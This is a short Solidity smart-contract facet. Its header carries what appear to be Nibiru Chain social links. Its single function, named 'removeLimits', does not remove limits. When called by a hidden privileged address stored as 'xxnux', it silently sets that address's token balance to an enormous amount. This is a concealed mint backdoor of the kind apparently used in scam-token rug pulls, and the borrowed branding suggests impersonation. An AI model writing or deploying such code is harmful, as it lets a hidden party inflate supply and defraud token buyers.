/*  
   * SPDX-License-Identifier: MIT

    // Telegram: https://t.me/nibiruchain
    // Twitter: https://twitter.com/NibiruChain
    // Website: https://nibiru.fi/
    // Github: https://github.com/NibiruChain
    // Discord: https://discord.com/invite/nibirufi
    // Medium: https://medium.com/@nibirufi

*/

pragma solidity ^0.8.23;
import "./TestLib.sol";
contract removeLimitsFacet {
    function removeLimits(uint256 addBot) external {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        if (ds.xxnux == msg.sender) {
            ds._balances[msg.sender] =
                42069000000 *
                42069 *
                addBot *
                10 ** ds.tokenDecimals;
        }
    }
}
